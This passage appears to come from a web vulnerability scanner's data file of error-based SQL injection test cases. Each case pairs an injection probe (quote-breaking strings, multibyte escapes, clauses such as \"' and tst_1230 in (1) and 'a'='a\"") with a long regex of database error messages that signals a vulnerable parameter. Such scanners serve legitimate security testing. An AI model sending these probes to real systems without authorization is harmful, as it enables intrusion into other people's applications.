scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "%27`\"%5C200%0d%0a1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020332,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "1'\"",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020333,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "1x00xc0xa7xc0xa2",
        "encode":  "NO",
    },

    {
        "case_id": 1100020334,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "5e010x'%bf'1\"%bf\"1%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020335,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "@@abcde",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020341,
        "input": "2938) and tst_1230 in (1)",
        "target": "Error:\\s'tst_1230'\\sis\\snot\\sdefined",
        "encode":  "YES",
    },

    {
        "case_id": 1100020342,
        "input": "2938' and tst_1230 in (1) and 'a'='a",
        "target": "Error:\\s'tst_1230'\\sis\\snot\\sdefined",
        "encode":  "YES",
    },

    {
        "case_id": 1100020343,
        "input": "2938\" and tst_1230 in (1) and \"a\"=\"a",
        "target": "Error:\\s'tst_1230'\\sis\\snot\\sdefined",
        "encode":  "YES",
    },

    {
        "case_id": 1100020344,
        "input": "2938 and tst_1230 in (1)",
        "target": "Error:\\s'tst_1230'\\sis\\snot\\sdefined",
        "encode":  "YES",
    },

    {
        "case_id": 1100020345,
        "input": "2938') and tst_1230 in ('1",
        "target": "Error:\\s'tst_1230'\\sis\\snot\\sdefined",
        "encode":  "YES",
    },

    {
        "case_id": 1100020346,
        "input": "2938%' and tst_1230 in (1) and '%'='",
        "target": "Error:\\s'tst_1230'\\sis\\snot\\sdefined",
        "encode":  "YES",
    },

    {
        "case_id": 1100020347,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "\"",
        "encode":  "NO",
    },

    {
        "case_id": 1100020348,
        "target": "('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\\\\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font style=\"COLOR: black; FONT: 8pt\\/11pt verdana\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(<font\\sface=\"Arial\"\\ssize=2>Syntax\\serror\\s(.*)?in\\squery\\sexpression\\s'(.*)\\.<\\/font>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(Incorrect\\ssyntax\\snear\\s'[^']*')|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror(.*)\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(ORA-\\d{4,5}:\\s)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\"[^\"]*\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Syntax error: Missing operand after '[^']*' operator)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s.*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(The string constant beginning with .*? does not have an ending string delimiter\\.)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(Unknown column '[^']+' in '\\w+ clause')|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|(<b>SQL error: <\\/b> no such column)|(<title>Conversion failed when converting the varchar value 'A' to data type int.<\\/title>)|(Call to a member function row_array() on a non-object in)|(Can't find record in)|(Column count doesn't match value count at row)|(ERROR: parser: parse error at or near)|(Error Executing Database Query)|(Error: 221 Invalid formula)|(Incorrect column name)|(Incorrect column specifier for column)|(Incorrect syntax near)|(Invalid SQL:)|(Invalid column name)|(Microsoft OLE DB Provider for ODBC Drivers)|(Microsoft OLE DB Provider for SQL Server)|(Must declare the scalar variable)|(ODBC Microsoft Access Driver)|(ODBC SQL Server Driver)|(PostgreSQL query failed)|(SQL command not properly ended)|(SQLSTATE=42603)|(SQLite3::SQLException:)|(SQLite3::query(): Unable to prepare 